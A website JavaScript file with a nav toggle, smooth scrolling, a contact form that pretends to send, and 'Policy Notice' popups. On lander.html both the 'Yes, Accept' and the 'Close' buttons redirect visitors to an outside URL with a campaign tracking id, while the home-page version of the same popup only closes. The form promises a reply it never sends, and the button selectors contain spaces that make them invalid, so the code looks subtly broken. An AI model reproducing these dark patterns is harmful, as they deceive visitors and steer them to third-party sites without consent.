// Mobile nav toggle

const navToggle = document.querySelector('[data-nav-toggle]');
const navMenu = document.querySelector('[data-nav-menu]');
if(navToggle && navMenu){
  navToggle.addEventListener('click', ()=>{
    navMenu.classList.toggle('open');
    navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
  })
}

// Smooth scroll
document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click', e=>{
    const href = a.getAttribute('href');
    if(href && href.startsWith('#')){
      const el = document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth', block:'start'});
      }
    }
  })
})

// Fake form submit
const form = document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit', (e)=>{
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
    form.reset();
  });
}

//   Play-gate popup for index.html - shows EVERY TIME
(function(){
  const path = window.location.pathname;
  const filename = path.split('/').pop() || 'index.html';
  
  // ✅ Detect if we're on index.html (or root which serves index.html)
  const isHome = filename === '' || filename === 'index.html' || path === '/' || path.endsWith('/');
  
  // Only run on index.html or root
  if(!isHome) return;

  // Wait for DOM to be fully ready
  function showIndexPopup(){
    const bd = document.createElement('div');
    bd.className = 'modal-backdrop';
    bd.innerHTML = `
      <div class="modal">
        <h3>Policy Notice</h3>
        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
        <div style="display:flex;gap:10px;flex-wrap:wrap">
          <button class="btn" id="  Play-yes">Yes, Accept</button>
          <button class="btn ghost" id="  Play-no">Close</button>
        </div>
      </div>`;
    document.body.appendChild(bd);
    bd.style.display = 'flex';

    function closeGate(){ 
      bd.style.display = 'none'; 
      bd.remove(); 
    }

    // Both buttons just close the modal and stay on index.html
    bd.querySelector('#  Play-yes').addEventListener('click', closeGate);
    bd.querySelector('#  Play-no').addEventListener('click', closeGate);
  }

  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', showIndexPopup);
  } else {
    showIndexPopup();
  }
})();

// Separate popup for lander.html ONLY
(function(){
  const path = window.location.pathname;
  const filename = path.split('/').pop();
  
  // ✅ Detect if we're specifically on lander.html
  const isLander = filename === 'lander.html';
  
  // Only run on lander.html
  if(!isLander) return;

  function showLanderPopup(){
    const bd = document.createElement('div');
    bd.className = 'modal-backdrop';
    bd.innerHTML = `
      <div class="modal">
        <h3>Policy Notice</h3>
        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
        <div style="display:flex;gap:10px;flex-wrap:wrap">
          <button class="btn" id="  Play-yes">Yes, Accept</button>
          <button class="btn ghost" id="  Play-no">Close</button>
        </div>
      </div>`;
    document.body.appendChild(bd);
    bd.style.display='flex';

    function redirect(){
 window.location.href = "https://syn9ro.com/?utm_campaign=HPcGdok7FL&v1=[v1]&v2=[v2]&v3=[v3]"
};
    
    // Both buttons redirect to external site
    bd.querySelector('#  Play-yes').addEventListener('click', redirect);
    bd.querySelector('#  Play-no').addEventListener('click', redirect);
  }

  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', showLanderPopup);
  } else {
    showLanderPopup();
  }
})();
